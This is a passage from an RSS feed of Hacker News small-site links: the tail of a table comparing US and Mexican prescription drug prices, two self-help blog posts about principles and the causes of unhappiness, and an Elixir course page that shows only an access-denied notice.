&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$9</p><p>Benicar HCT&nbsp; (high blood pressure)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$187&nbsp; &nbsp; &nbsp; &nbsp; Mexico:</p><p>Betaseron&nbsp; (multiple sclerosis)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; one kit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $6,020&nbsp; &nbsp; Mexico:&nbsp; $1,532</p><p>Bystolic&nbsp; (high blood pressure)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $120</p><p>Blncyto&nbsp; (cancer)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; one month&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$3,878&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico:&nbsp;</p><p>Celebrex&nbsp; (arthritis)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $55</p><p>Cialis - ED &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$138</p><p>Cyramza&nbsp; (cancer)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; one month &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;$13,672&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico:</p><p>Combivent Respimat&nbsp; inhaler&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; one inhaler &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$397&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico: $32</p><p>Copaxone - (multiple sclerosis)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30 syringes &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $1,953&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico: $1,416</p><p>Coreg  -   (blood pressure)                                                  100                                    $525             Mexico: $135</p><p>Crestor, a cholesterol-lowering statin drug &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$195</p><p>Cubicin&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $473&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Mexico:&nbsp; $118</p><p>Cymbalta  (Clorhidrato de Duloxetina)                        28 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  &nbsp;$90         Mexico:  $37</p><p>Dexilant&nbsp; (heartburn)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $258</p><p>Diovan&nbsp; (high blood pressure )&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$18</p><p>Desmopressin (Minirin)  (diabetes)                                                                     $134               Mexico:  $82</p><p>Enbrel&nbsp; (arthritis)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; one carton &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$2,246&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico:&nbsp; $592</p><p>Epogen, an injectable anemia drug &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; four vials &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$148. 00</p><p>Erbitux&nbsp; (cancer)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;per ampula&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $1,274&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico:&nbsp; $424&nbsp;</p><p>Evista&nbsp; (osteoporosis)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$50</p><p>Flomax (tamsulosin) -&nbsp;incontinence &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;one month&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$15</p><p>Flovent HFA - inhaler &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;inhaler &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; $220</p><p>Gilenya - multiple sclerosis&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;one month &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$5,300&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Mexico: $3,076</p><p>Gleevec&nbsp; (leukemias)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $3,600 &nbsp;&nbsp; &nbsp; &nbsp;Mexico:&nbsp; &nbsp;$2,106&nbsp; (Glivec)</p><p>Glucophage (metformin), a diabetes drug &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 60 &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $3</p><p>Herceptin&nbsp; (breast cancer)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; a month&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$4,500&nbsp; &nbsp; &nbsp; Mexico: $2,445</p><p>Humira&nbsp; (Crohn's disease)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;one carton &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $3,000&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Mexico: $543 dollars</p><p>Hycd/apap (Narcotic painkiller) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 60 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $18</p><p>Imdur&nbsp; (&nbsp;angina )&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $15</p><p>Hydrochlorothiazide&nbsp; (blood pressure)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $5</p><p>Hydrocodone/acetaminophen - pain killer &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$10</p><p>Invega Sustenna&nbsp; (schizophrenia)&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; one syringe &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;$2,100&nbsp; &nbsp; &nbsp; &nbsp;Mexico:&nbsp; $337</p><p>Imatitanib mesylate  (cancer) (Glivec)                                              $8,800/yr  = $488/mo     Mexico: $621 for 10 capsules</p><p>Janumet&nbsp; (diabetes )&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $&nbsp;181&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Mexico:&nbsp; $23</p><p>Jardiance&nbsp;  (diabetes)                                                               30                                     $529          Mexico:  $621</p><p>Lantus Solostar - diabetes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$453&nbsp; &nbsp; &nbsp; &nbsp;Mexico:&nbsp; $97</p><p>Lanoxin (congestive heart failure) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $30</p><p>Latuda - bipolar disorder &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; 30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$1,389&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico:&nbsp;</p><p>Levemir -&nbsp;diabetes &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; one carton &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$417&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico: $131</p><p>Lenvima - cancer&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;60&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $16,681&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Mexico:&nbsp;</p><p>Levothyroxine - hypothyroidism &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; $10</p><p>Levothyroxine Sod (Hypothyroid) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;$10</p><p>Lipitor, a cholesterol-lowering statin drug &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;30 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ventanasmexico.com/blog/the-price-of-americas-most-expensive-drugs-in-mexico">https://www.ventanasmexico.com/blog/the-price-of-americas-most-expensive-drugs-in-mexico</a></em></p>]]>
            </description>
            <link>https://www.ventanasmexico.com/blog/the-price-of-americas-most-expensive-drugs-in-mexico</link>
            <guid isPermaLink="false">hacker-news-small-sites-25184218</guid>
            <pubDate>Mon, 23 Nov 2020 07:00:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't aim to be liked or respected]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25184044">thread link</a>) | @madrasman
<br/>
November 22, 2020 | https://www.aswathkrishnan.com/2020/11/dont-chase-being-liked-or-respected.html | <a href="https://web.archive.org/web/*/https://www.aswathkrishnan.com/2020/11/dont-chase-being-liked-or-respected.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-6318552918068859153" itemprop="description articleBody">
<p>I'm somewhat soft at work and avoid ruffling feathers, so this tweet struck a chord.</p><blockquote><p dir="ltr" lang="en">Heard this today from a coach, and resonated: stop chasing being liked by everyone, start chasing being respected by everyone.</p>— Akshay Kothari (@akothari) <a href="https://twitter.com/akothari/status/1329652910204981250?ref_src=twsrc%5Etfw">November 20, 2020</a></blockquote> <p>Don't misunderstand me. Being liked feels good and being nice builds healthy and fun relationships. But I find that when I'm mainly driven by wanting to please or not offend people, I end up making suboptimal or unprincipled decisions that make me unhappy and unsuccessful in the long run.&nbsp;</p><p>People have various reasons to like or dislike you. Many of these reasons are selfish, irrational, short-term and finicky. Putting your self-worth, purpose and actions at the whims and fancies of the black box of being liked is an unclear and volatile approach. The reasons to like or dislike are often at odds with other people's and even your welfare, principles and goals. So aiming to be liked doesn't lead to the best outcomes.&nbsp;</p><p>I'll go a step further from this tweet and say that <i>don't even aim to be respected</i>. Even though chasing respect may be in some ways better because respect can be slightly more rational, principled, long-term or outcome based, it has the same core problems as chasing being liked.&nbsp;</p><p><b>So what is the alternative? Chase your principles and goals.&nbsp;<span></span></b></p><p>The core idea behind Stephen Covey's 7 Habits of Success People is to be "Principle centered" rather than centering around People, Self, Family, Money, Health etc.&nbsp;</p><p>That means you define (and periodically revise) your principles and goals. Then you aim to live with <i>integrity</i> - your thoughts, words, actions match your values, principles and goals. You can and may likely have to still be humble, empathetic, respectful and supportive of others while pursuing those, but you may not make all people happy and that's okay.&nbsp;</p><p>Being principle-centered will mean being opinionated, saying no and disagreeing with people, that may make people dislike you. There's a chance that some of them may respect you in long-run because they see that you are independent, principled and successful. But most importantly, you live with the happiness of working on what you control, chasing self-created and steady goals, and the satisfaction and certainty of being true to your core principles and living the life you want.&nbsp;</p>

</div></div>]]>
            </description>
            <link>https://www.aswathkrishnan.com/2020/11/dont-chase-being-liked-or-respected.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25184044</guid>
            <pubDate>Mon, 23 Nov 2020 06:12:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Four roots of all Unhappiness and Worry]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25183985">thread link</a>) | @madrasman
<br/>
November 22, 2020 | https://www.aswathkrishnan.com/2020/11/the-four-roots-of-unhappiness-and-worry.html | <a href="https://web.archive.org/web/*/https://www.aswathkrishnan.com/2020/11/the-four-roots-of-unhappiness-and-worry.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-6940441155851294173" itemprop="description articleBody">
<p>We get upset and unhappy about many things.&nbsp;</p><p>Your manager or customer criticized your work. Your colleagues aren't being thoughtful or cooperating. You didn't get the promotion, award, or raise you wanted or think you deserved.&nbsp;</p><p>Your parents, wife, friends or kids are asking you to do things you don't want to or misunderstand you. They don't act in a way that you feel is right or helpful.&nbsp;</p><p>You are running low on savings and income, and worried that you can't support yourself and your family. You are in physical pain or your health is declining and you have unusual body aches and insomnias.&nbsp;</p><p>Your country or community is divided. The system seems broken, leaders are corrupt, people are selfish and ignorant.&nbsp;&nbsp;</p><p>All of these worries and unhappiness are rooted in these four root causes.&nbsp;</p><p>1. <b>Judgement instead of Acceptance</b>. You don't accept reality as it is. You lament it, you disagree with it, you think it's unfair or it sucks. You expect and wish it to be different or better.&nbsp;</p><p>Why did you have those expectations in the first place? Why did you think people, your environment, your mind and body are going to be just the way you want them to? Who told you that life is all rainbows and butterflies.</p><p>You can hope, plan and work towards an ideal reality in the future. But your current reality is what is is. Don't judge it, regret it, or deny it. Love it, embrace it, understand it, then play and work with it. <a href="http://www.aswathkrishnan.com/2020/08/life-is-improv-create-great-scenes.html" target="_blank">Life is an improv</a>&nbsp;show - you don't control the scenes, you accept and act in them.&nbsp;</p><p>2. <b>Attachment instead of Openness</b>. You want something or don't want to lose something you have. You decide to be unhappy until you get that and worried whenever they are uncertain or even slightly threatened.&nbsp;</p><p>You have no idea about why you were born, what life is about and you know you will eventually die and be absolutely forgotten. So what are these wants and where do these come from? Are they worth the constant unhappiness and anxiety?</p><p>We can't all live like monks with no wants or attachments. But pick your attachments consciously and limit it to a few meaningful one - don't just pick them up unconsciously.&nbsp; When you have a negative emotion, think about it, uncover the underlying attachment and eliminate it. Be flexible with your wants and <a href="http://www.aswathkrishnan.com/2019/10/peace-and-joy.html" target="_blank">go with the flow</a>. Everything is impermanent.&nbsp;<span></span></p><p><b>3. Negativity and Hate instead of Optimism and Love. </b>You assume things and people are worse than they are. You cave in to comparison, greed, envy or jealousy. You think, say and act on these negativities. They make you more upset and act more negatively, which makes the situation even worse.&nbsp;</p><p>Accept the nature of people and the world as they are. Everyone's Be a well wisher and give everyone a benefit of the doubt.&nbsp;<a href="https://www.blogger.com/blog/post/edit/2213281878057251230/6895673630879853860" target="_blank">Don't assume malice, when it could be misunderstanding</a>, ignorance or incompetence. This doesn't mean that you have to be naive and be taken advantage of. Hold your principles, work with situation as they are, choose to be around people and situations that align with your values.&nbsp;</p><p><b>4. Nature instead of Practice. </b>You expect to be happy and balanced by default, without consistent effort. You get out of the rut once or twice, experience clarity, and expect that to last forever.&nbsp;</p><p>We are survival machines. Our biological programming, innate nature and societal influence will always bias us towards worry, insecurity, and wanting. Our equilibrium is to be unhappy.&nbsp;</p><p>Just like you don't expect to be muscular if you don't work out regularly, don't expect to be calm and happy if you don't work on your mind. Move your body often to move your mind. Take time to relax and to do things you enjoy. Share your situation and get help from a therapists, coaches or friends. Be intentional about your life philosophy, goals, people and environment. Practice regular meditation, gratitude, and reflection.&nbsp;</p><p>You got one life - cherish it and live it well!&nbsp;</p>

</div></div>]]>
            </description>
            <link>https://www.aswathkrishnan.com/2020/11/the-four-roots-of-unhappiness-and-worry.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25183985</guid>
            <pubDate>Mon, 23 Nov 2020 05:57:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn Elixir by making 5 small games]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25183869">thread link</a>) | @AlchemistCamp
<br/>
November 22, 2020 | https://alchemist.camp/little-potions/hello-world | <a href="https://web.archive.org/web/*/https://alchemist.camp/little-potions/hello-world">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="alert"><p>You don't have access to that page. Do you have a <a href="https://alchemist.camp/little-potions/redeem">license to redeem</a>?</p></div></div>]]>
            </description>
